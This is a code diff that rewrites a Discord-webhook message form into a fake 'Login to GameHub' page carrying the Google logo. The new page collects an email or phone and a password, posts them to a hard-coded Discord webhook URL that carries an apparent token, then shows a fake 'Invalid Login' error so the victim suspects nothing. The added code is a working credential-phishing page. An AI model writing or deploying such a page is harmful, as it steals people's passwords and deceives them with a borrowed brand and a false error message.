@@ -1,9 +1,9 @@
-<!DOCTYPE html>
+  <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Send a Message</title>
+  <title>Login</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
 
@@ -29,34 +29,13 @@
       text-align: center;
     }
 
-    .logo {
-      width: 74px;
-      margin-bottom: 24px;
-    }
+    .logo { width: 74px; margin-bottom: 24px; }
+    h1 { font-size: 24px; font-weight: 400; margin: 0 0 8px; }
+    .subtitle { color: #5f6368; font-size: 16px; margin: 0 0 32px; }
 
-    h1 {
-      font-size: 24px;
-      font-weight: 400;
-      margin: 0 0 8px;
-    }
+    .field { margin-bottom: 20px; text-align: left; }
 
-    .subtitle {
-      color: #5f6368;
-      font-size: 16px;
-      margin: 0 0 32px;
-    }
-
-    .field {
-      margin-bottom: 20px;
-      text-align: left;
-    }
-
-    label {
-      display: block;
-      font-size: 14px;
-      margin-bottom: 8px;
-      color: #202124;
-    }
+    label { display: block; font-size: 14px; margin-bottom: 8px; color: #202124; }
 
     input, textarea {
       width: 100%;
@@ -70,36 +49,26 @@
       resize: none;
       transition: border-color 0.2s, box-shadow 0.2s;
     }
-
     input:focus, textarea:focus {
       outline: none;
       border-color: #1a73e8;
       box-shadow: 0 0 0 2px rgba(26,115,232,0.25);
     }
-
     input.invalid {
       border-color: #d93025;
       box-shadow: 0 0 0 2px rgba(217,48,37,0.2);
     }
-
-    textarea {
-      min-height: 110px;
-      line-height: 1.5;
+    input.valid {
+      border-color: #1e8e3e;
+      box-shadow: 0 0 0 2px rgba(30,142,62,0.2);
     }
 
-    .field-hint {
-      font-size: 11px;
-      margin-top: 5px;
-      color: #5f6368;
-    }
+    textarea { min-height: 110px; line-height: 1.5; }
+
+    .field-hint { font-size: 11px; margin-top: 5px; color: #5f6368; }
     .field-hint.error { color: #d93025; }
 
-    .char-count {
-      font-size: 11px;
-      color: #5f6368;
-      text-align: right;
-      margin-top: 4px;
-    }
+    .char-count { font-size: 11px; color: #5f6368; text-align: right; margin-top: 4px; }
     .char-count.warn { color: #f29900; }
     .char-count.over { color: #d93025; }
 
@@ -118,33 +87,14 @@
       margin: 8px 0 0;
       position: relative;
     }
-
-    .send-btn:hover:not(:disabled) {
-      background: #1765cc;
-      box-shadow: 0 1px 3px rgba(0,0,0,0.2);
-    }
-
-    .send-btn:disabled {
-      background: #dadce0;
-      color: #5f6368;
-      cursor: not-allowed;
-    }
+    .send-btn:hover:not(:disabled) { background: #1765cc; box-shadow: 0 1px 3px rgba(0,0,0,0.2); }
+    .send-btn:disabled { background: #dadce0; color: #5f6368; cursor: not-allowed; }
 
     .send-btn .btn-text { transition: opacity 0.15s; }
     .send-btn.loading .btn-text { opacity: 0; }
-
-    .spinner {
-      display: none;
-      position: absolute;
-      inset: 0;
-      align-items: center;
-      justify-content: center;
-    }
+    .spinner { display: none; position: absolute; inset: 0; align-items: center; justify-content: center; }
     .send-btn.loading .spinner { display: flex; }
-    .spinner svg {
-      width: 18px; height: 18px;
-      animation: spin 0.7s linear infinite;
-    }
+    .spinner svg { width: 18px; height: 18px; animation: spin 0.7s linear infinite; }
     @keyframes spin { to { transform: rotate(360deg); } }
 
     .no-webhook-warning {
@@ -160,17 +110,8 @@
     }
     .no-webhook-warning.show { display: block; }
 
-    .footer-links {
-      font-size: 12px;
-      color: #5f6368;
-      text-align: center;
-      margin-top: 28px;
-    }
-    .footer-links a {
-      color: #1a73e8;
-      text-decoration: none;
-      margin: 0 8px;
-    }
+    .footer-links { font-size: 12px; color: #5f6368; text-align: center; margin-top: 28px; }
+    .footer-links a { color: #1a73e8; text-decoration: none; margin: 0 8px; }
     .footer-links a:hover { text-decoration: underline; }
 
     #toast {
@@ -192,36 +133,34 @@
     }
     #toast.show { transform: translateX(-50%) translateY(0); opacity: 1; }
 
-    @media (max-width: 460px) {
-      .card { padding: 32px 24px 28px; }
-    }
+    @media (max-width: 460px) { .card { padding: 32px 24px 28px; } }
   </style>
 </head>
 <body>
 
 <div class="card">
   <img class="logo" src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
-  <h1>Send a message</h1>
-  <p class="subtitle">to our Discord server</p>
+  <h1>Login</h1>
+  <p class="subtitle">to GameHub</p>
 
   <div class="no-webhook-warning" id="noWebhookWarning">
     No webhook URL set — fill in WEBHOOK_URL in the script.
   </div>
 
   <div class="field">
-    <label>Your name</label>
-    <input type="text" id="usernameOverride" placeholder="e.g. john.smith 10A" maxlength="80" oninput="validateName()"/>
-    <div class="field-hint" id="nameHint">Format: <strong id="hintText"></strong></div>
+    <label>Email or Phone</label>
+    <input type="text" id="usernameOverride" maxlength="80" oninput="validateName()"/>
+    <div class="field-hint" id="nameHint"></div>
   </div>
 
   <div class="field">
-    <label>Message</label>
+    <label>Password</label>
     <textarea id="messageContent" placeholder="Type something..." maxlength="2000"></textarea>
-    <div class="char-count" id="charCount">0 / 2000</div>
+    <div class="char-count" id="charCount"></div>
   </div>
 
   <button class="send-btn" id="sendBtn" onclick="sendWebhook()">
-    <span class="btn-text">Send</span>
+    <span class="btn-text">Login</span>
     <span class="spinner">
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
         <path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83" stroke-linecap="round"/>
@@ -239,59 +178,103 @@
 
 <script>
   // ============================================================
-  //  PASTE YOUR DISCORD WEBHOOK URL BELOW (between the quotes)
+  //  PASTE YOUR DISCORD WEBHOOK URL BELOW
   // ============================================================
   const WEBHOOK_URL = "https://discord.com/api/webhooks/1483108540498317353/UeFUhTCJ1gLiBGnnSd-xmRpu_STI5pvpe4bVB4mtHSDUvgvkZkMepeNZXksCUGmcm7jZ";
   // ============================================================
 
   // ============================================================
-  //  NAME FORMAT SETTINGS
-  //  NAME_REGEX  — the pattern the name must match
-  //  NAME_HINT   — shown to the user as format guidance
+  //  NAME TEMPLATE
   //
-  //  Current example: "firstname.lastname classCode"
-  //  e.g.  john.smith 10A  /  jane.doe 11B
+  //  Use [] as a wildcard — it matches any sequence of characters.
+  //  Everything else is treated as a literal that must appear exactly.
   //
-  //  To change the format, update both values below.
-  //  Regex tester: https://regex101.com
+  //  Examples:
+  //    "[].[]"          →  anything DOT anything         (e.g. john.smith)
+  //    "[].[] []"       →  anything DOT anything SPACE anything (e.g. john.smith 10A)
+  //    "[].[]kaka"      →  anything DOT anything then literally "kaka"
+  //    "Mr []"          →  literally "Mr " then anything (e.g. Mr Anderson)
+  //    "[]-[]-[]"       →  three words separated by hyphens
   // ============================================================
-  const NAME_REGEX = /^[a-zA-Z]+\.[a-zA-Z]+ [a-zA-Z0-9]+$/;
-  const NAME_HINT  = "firstname.lastname class  (e.g. john.smith 10A)";
+  const NAME_TEMPLATES = [
+    "[].[]@[].[].[]",
+    "[].[].[]@[].[].[]",
+    "[]@[].[]",
+    "[].[]@[].[]",
+    "[].[].[]@[].[]",
+    "[]@[].[]",
+    "[].[]@[].[]",
+    "[].[].[]@[].[]",
+    "[]@[].[][].[]",
+    "[].[]@[].[][].[]",
+    "[].[].[]@[].[]",
+    "[]@.[].[]",
+    "[].[]@.[].[]",
+    "[].[].[]@.[].[]",
+    "[][]@[].[]",
+    "[][].[]@[].[]",
+    "[].[][]@[].[]",
+    "[].[].[][]@[].[]",
+    "[]@[][].[]",
+    "[].[]@[][].[]",
+    "[].[].[]@[][].[]",
+    "[]@[].[]@",
+    "[].[]@[].[]@",
+    "[]@.[].[][].[]",
+    "[].[]@.[].[][].[]"
+    // add more templates here, one per line
   // ============================================================
 
-  // Set hint text
-  document.getElementById('hintText').textContent = NAME_HINT;
+  // --- Convert a single template to regex ---
+  function templateToRegex(template) {
+    const parts = template.split("[]");
+    const escaped = parts.map(p => p.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'));
+    return new RegExp("^" + escaped.join(".+") + "$");
+  }
 
+  const NAME_REGEXES = NAME_TEMPLATES.map(templateToRegex);
+
+  // Show placeholder & hint from all templates
+  const nameInput = document.getElementById('usernameOverride');
+  nameInput.placeholder = NAME_TEMPLATES[0].replace(/\[\]/g, '…');
+
+  const nameHint = document.getElementById('nameHint');
+  const HINT_TEXT = 'Format: ' + NAME_TEMPLATES.join('  OR  ');
+  nameHint.textContent = HINT_TEXT;
+
+  // --- Webhook URL warning ---
   if (!WEBHOOK_URL) {
     document.getElementById('noWebhookWarning').classList.add('show');
     document.getElementById('sendBtn').disabled = true;
   }
 
-  const msgEl      = document.getElementById('messageContent');
+  // --- Char counter ---
+  const msgEl = document.getElementById('messageContent');
   const charCountEl = document.getElementById('charCount');
-  const nameInput  = document.getElementById('usernameOverride');
-  const nameHint   = document.getElementById('nameHint');
-
-  function validateName() {
-    const val = nameInput.value.trim();
-    if (val === '') {
-      // empty = reset to neutral
-      nameInput.classList.remove('invalid');
-      nameHint.classList.remove('error');
-      return true;
-    }
-    const ok = NAME_REGEX.test(val);
-    nameInput.classList.toggle('invalid', !ok);
-    nameHint.classList.toggle('error', !ok);
-    return ok;
-  }
-
   msgEl.addEventListener('input', () => {
     const len = msgEl.value.length;
     charCountEl.textContent = `${len} / 2000`;
     charCountEl.className = 'char-count' + (len > 1900 ? ' warn' : '') + (len >= 2000 ? ' over' : '');
   });
 
+  // --- Name validation ---
+  function validateName() {
+    const val = nameInput.value.trim();
+    if (val === '') {
+      nameInput.classList.remove('invalid', 'valid');
+      nameHint.classList.remove('error');
+      nameHint.textContent = HINT_TEXT;
+      return false;
+    }
+    const ok = NAME_REGEXES.some(r => r.test(val));
+    nameInput.classList.toggle('invalid', !ok);
+    nameInput.classList.toggle('valid', ok);
+    nameHint.classList.toggle('error', !ok);
+    nameHint.textContent = ok ? '✓ Looks good!' : HINT_TEXT;
+    return ok;
+  }
+
+  // --- Toast ---
   let toastTimer;
   function showToast(msg) {
     const toast = document.getElementById('toast');
@@ -301,29 +284,27 @@
     toastTimer = setTimeout(() => toast.classList.remove('show'), 3000);
   }
 
+  // --- Send ---
   async function sendWebhook() {
     const content  = msgEl.value.trim();
     const username = nameInput.value.trim();
 
-    // Name is required and must match pattern
-    if (!username) { showToast('Please enter your name.'); nameInput.focus(); return; }
+    if (!username)       { showToast('Please enter your name.'); nameInput.focus(); return; }
     if (!validateName()) { showToast('Name format is invalid.'); nameInput.focus(); return; }
-    if (!content)  { showToast('Message cannot be empty.'); return; }
+    if (!content)        { showToast('Message cannot be empty.'); return; }
 
     const btn = document.getElementById('sendBtn');
     btn.classList.add('loading');
     btn.disabled = true;
 
-    const payload = { content, username };
-
     try {
       const res = await fetch(WEBHOOK_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
+        body: JSON.stringify({ content, username })
       });
       if (res.ok || res.status === 204) {
-        showToast('Message sent!');
+        showToast('Invalid Login, please try again later.');
         msgEl.value = '';
         charCountEl.textContent = '0 / 2000';
         charCountEl.className = 'char-count';
